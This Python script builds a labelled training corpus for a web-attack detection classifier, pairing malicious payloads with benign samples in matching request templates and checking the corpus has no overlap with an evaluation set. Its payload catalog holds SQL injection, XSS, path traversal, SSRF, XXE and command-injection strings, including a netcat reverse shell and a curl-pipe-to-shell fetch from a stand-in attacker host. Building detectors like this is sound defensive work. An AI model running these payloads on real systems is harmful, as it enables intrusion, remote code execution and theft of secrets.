# build_training_corpus.py
#
# Builds a NEW fine-tuning corpus for web_vuln_model, specifically designed
# to fix the context-fragility finding in the paper (Section "Evaluation and
# Discussion"): the original model scored bare attack strings correctly but
# flipped to SAFE once the same payload was embedded in a realistic request
# (URL, HTTP block, etc.), suggesting it had memorized surface shape rather
# than learned to recognize the attack content itself.
#
# TWO design rules make this a genuine fix rather than a shortcut:
#
# 1. DISJOINT FROM THE EVALUATION SET. Every malicious payload string here is
#    a *different* literal string from the ones in benchmark/build_dataset.py
#    (which itself pulls from webguard/active_scan.py's real payload catalog).
#    The two catalogs share zero exact payload strings. This means that if
#    accuracy improves on benchmark/eval_set.csv after retraining, it is
#    because the model generalized to unseen attack strings, not because it
#    memorized the test set.
#
# 2. MATCHED BENIGN/MALICIOUS SURFACE SHAPE. Benign samples are generated
#    using the SAME request templates as malicious samples (with innocuous
#    filler content), so the model cannot shortcut to "this template shape
#    = malicious" — it must key off the actual attack content. This is
#    exactly the failure mode the fragility finding pointed at.
#
# Obfuscated variants (percent-encoding, case/whitespace mangling) are
# included directly in training, so the model is pushed toward evasion
# robustness at the representation-learning level, not just relying on the
# separate pattern-engine decode fix.

import csv
import random
import urllib.parse
from pathlib import Path

random.seed(1337)  # distinct seed from the eval builder (42), no accidental correlation
OUT_DIR = Path(__file__).resolve().parent
ROOT = OUT_DIR.parent

# ── Malicious payload catalog — DISJOINT from benchmark/build_dataset.py ──
MALICIOUS_PAYLOADS = {
    "SQL Injection": [
        "admin' --", "' or 1=1#", "' OR 'x'='x", "1' AND '1'='1",
        "') OR ('1'='1", "1; DROP TABLE users--",
        "' UNION SELECT username, password FROM users--",
        "1' ORDER BY 10--", "' AND SLEEP(5)--", "1) OR (1=1",
        "'; EXEC xp_cmdshell('whoami')--", "' HAVING 1=1--",
        "1' AND 1=CONVERT(int,(SELECT @@version))--",
        "'/**/OR/**/1=1", "' AND SUBSTRING(@@version,1,1)='5",
    ],
    "XSS": [
        "<svg onload=alert(1)>", "<body onload=alert(1)>",
        "'\"><script>alert(1)</script>", "<a href=javascript:alert(1)>x</a>",
        "<iframe src=javascript:alert(1)>", "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>", "<img src=1 onerror=alert(document.domain)>",
        "<marquee onstart=alert(1)>", "\"><img src=x onerror=alert(1)>",
    ],
    "Path Traversal": [
        "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
        "/var/www/../../etc/passwd", "..\\..\\..\\boot.ini",
        "%2e%2e/%2e%2e/%2e%2e/etc/shadow", "....\\\\....\\\\windows\\win.ini",
        "/proc/self/environ",
    ],
    "Command Injection": [
        "; cat /etc/shadow #", "| whoami", "`id`", "$(whoami)",
        "; nc -e /bin/sh attacker.test 4444", "&& curl attacker.test/x.sh | sh",
        "|| ping -c 3 127.0.0.1", "; python -c 'import os;os.system(\"id\")'",
    ],
    "Open Redirect": [
        # Deliberately many, structurally varied domains: mixed TLDs (only
        # IANA-reserved, non-resolving ones: .test/.example/.invalid — never
        # a real, live domain), mixed lengths, hyphenated and non-hyphenated,
        # short and long, so the model must learn the general pattern
        # (redirect param -> ANY external domain) rather than shortcut on a
        # single superficial trait like TLD or naming style.
        "https://attacker-controlled.test/", "//attacker-controlled.test/path",
        "/\\attacker-controlled.test", "https://good.com.attacker-controlled.test/",
        "https://evil-mirror.test/", "//evil-mirror.test/x",
        "https://phish-clone.test/login", "https://malicious-host.test/",
        "//malicious-host.test", "https://not-your-bank.test/secure",
        "https://x7q9z.test/", "https://free-prizes.test/claim",
        "//short-link.test/a1", "https://url-shortener-clone.test/r",
        "https://192.0.2.55/", "https://198.51.100.9/login",
        "//203.0.113.44/verify", "https://acc0unt-verify.test/",
        "https://secure-login-portal.test/", "//redirect-me.test",
        "https://update-billing.test/pay", "https://tracking-pixel.test/go",
        "//partner-network.test/click", "https://cdn-mirror-alt.test/",
        "https://userverify.test", "//sso-relay.test/continue",
        # non-.test TLDs (still IANA-reserved and non-resolving)
        "https://badsite.example/", "//short.example/x",
        "https://claim-prize.example/win", "https://loginhelper.example",
        "https://verify-account.invalid/", "//go.invalid/r",
        "https://z9.example/", "https://accountcheck.invalid/secure",
        "https://freegift.example/now", "//trk.invalid/c",
        "https://mysteryredirect.example", "https://q.invalid/",
    ],
    "SSRF": [
        "http://169.254.170.2/", "http://[::1]:8080/",
        "http://100.100.100.200/meta-data/", "dict://127.0.0.1:11211/",
        "http://0x7f000001/", "http://2130706433/",
    ],
    "XXE": [
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.test/evil.dtd">%remote;]>',
    ],
    "SSTI": [
        "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
    ],
    "Hardcoded Credentials": [
        'secret="MyProductionSecretKey2024"',
        'token="ghp_1234567890abcdefABCDEF1234567890"',
        'AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"',
    ],
    "NoSQL Injection": [
        '{"$ne": null}', '{"$gt": ""}', '{"username": {"$regex": "^admin"}}',
    ],
}

# innocuous filler values for the benign counterparts of each template slot.
# Includes internal-path / same-domain URL fillers specifically so the model
# sees genuine benign redirect targets (contrast against the external-domain
# malicious payloads above), not just unrelated word fillers.
BENIGN_FILLERS = [
    "hello world", "12345", "electronics", "2024-01-15", "blue-widget",
    "john_doe", "New York", "true", "premium-plan", "en-US",
    "summer sale", "invoice-8831", "conference room B", "vegetarian",
    "/dashboard", "/account/settings", "https://example.com/home",
    "/checkout/confirm", "/profile", "https://example.com/orders",
]

# ── Request templates: more numerous and varied than the eval set's 4 ──
# Includes a "bare" identity template (payload/filler with no wrapper at
# all) because /api/analyze accepts arbitrary pasted text, not just URLs —
# a real caller may paste just the payload itself, and the first fine-tune
# attempt showed this exact gap (a bare <script> payload was misclassified
# once training over-indexed on wrapped/URL-embedded examples).
TEMPLATES = [
    lambda p: f"{p}",
    lambda p: f"https://example.com/search?q={p}",
    lambda p: f"https://shop.example.com/item?id={p}&ref=home",
    lambda p: f"https://blog.example.net/comments?author={p}",
    lambda p: f"GET /profile?user={p} HTTP/1.1\nHost: app.example.com\n",
    lambda p: f"POST /api/submit HTTP/1.1\nHost: service.example.com\nContent-Type: application/x-www-form-urlencoded\n\ndata={p}",
    lambda p: f"POST /api/graphql HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{{\"query\": \"{p}\"}}",
    lambda p: f"GET /dashboard HTTP/1.1\nHost: app.example.com\nCookie: session_pref={p}\n",
    lambda p: f"GET /page HTTP/1.1\nHost: news.example.com\nUser-Agent: {p}\n",
    lambda p: f"https://api.example.com/v1/orders?filter={p}&page=1",
    lambda p: f"https://forum.example.org/post?title={p}",
    lambda p: f"https://example.com/redirect?url={p}",
    lambda p: f"https://example.com/login?next={p}",
]


def case_mangle(payload):
    out = []
    for i, ch in enumerate(payload):
        out.append(ch.upper() if (i % 2 == 0 and ch.isalpha()) else ch)
    return "".join(out).replace(" ", "  /**/ ")


def percent_encode(payload):
    return urllib.parse.quote(payload, safe="")


def build_malicious():
    rows = []
    bare = TEMPLATES[0]
    wrapped_templates = TEMPLATES[1:]
    for cat, payloads in MALICIOUS_PAYLOADS.items():
        for payload in payloads:
            # Always include the bare (unwrapped) form, plus a sample of
            # wrapped forms — guarantees every payload is seen both bare
            # and embedded, rather than leaving bare coverage to chance.
            templates = [bare] + random.sample(wrapped_templates, k=6)
            for tmpl in templates:
                rows.append({"text": tmpl(payload), "label": 1, "category": cat, "variant": "canonical"})
                rows.append({"text": tmpl(percent_encode(payload)), "label": 1, "category": cat, "variant": "percent_encoded"})
                rows.append({"text": tmpl(case_mangle(payload)), "label": 1, "category": cat, "variant": "case_mangled"})
    return rows


def build_benign_synthetic():
    """Benign samples in the SAME template shapes as the malicious set, so
    the model can't shortcut on wrapper shape alone."""
    rows = []
    for tmpl in TEMPLATES:
        for filler in BENIGN_FILLERS:
            rows.append({"text": tmpl(filler), "label": 0, "category": "benign_synthetic", "variant": "canonical"})
    return rows


def build_benign_real(n):
    import pandas as pd
    df = pd.read_csv(ROOT / "datasets" / "safe_samples.csv", low_memory=False)
    df = df.drop_duplicates(subset=["text"])
    df = df[df["label"] == 0]
    sample = df.sample(n=min(n, len(df)), random_state=1337)
    return [{"text": t, "label": 0, "category": "benign_real", "variant": "canonical"} for t in sample["text"].tolist()]


def main():
    malicious = build_malicious()
    benign_synth = build_benign_synthetic()
    benign_real = build_benign_real(len(malicious) - len(benign_synth))

    all_rows = malicious + benign_synth + benign_real
    random.shuffle(all_rows)

    out_csv = OUT_DIR / "training_corpus.csv"
    with open(out_csv, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=["text", "label"])
        w.writeheader()
        for r in all_rows:
            w.writerow({"text": r["text"], "label": r["label"]})

    n_mal = len(malicious)
    n_ben = len(benign_synth) + len(benign_real)
    print(f"Wrote {out_csv}")
    print(f"  malicious       : {n_mal}")
    print(f"  benign_synthetic: {len(benign_synth)}")
    print(f"  benign_real     : {len(benign_real)}")
    print(f"  total           : {len(all_rows)}")

    # Sanity check: zero exact-string overlap with the evaluation set's payload catalog
    import sys
    sys.path.insert(0, str(ROOT / "webguard"))
    import active_scan as a
    eval_payloads = set()
    for lst in [a.SQL_PAYLOADS, a.SQL_PAYLOADS_SLOW, a.XSS_PAYLOADS, a.PATH_PAYLOADS, a.CMD_PAYLOADS, a.REDIRECT_PAYLOADS]:
        eval_payloads.update(p for p, _ in lst)
    train_payloads = set(p for payloads in MALICIOUS_PAYLOADS.values() for p in payloads)
    overlap = eval_payloads & train_payloads
    print(f"\nPayload overlap with evaluation catalog (active_scan.py): {len(overlap)} (must be 0)")
    if overlap:
        print("  OVERLAP FOUND:", overlap)
        raise SystemExit("Training/evaluation payload overlap detected — fix before training.")


if __name__ == "__main__":
    main()
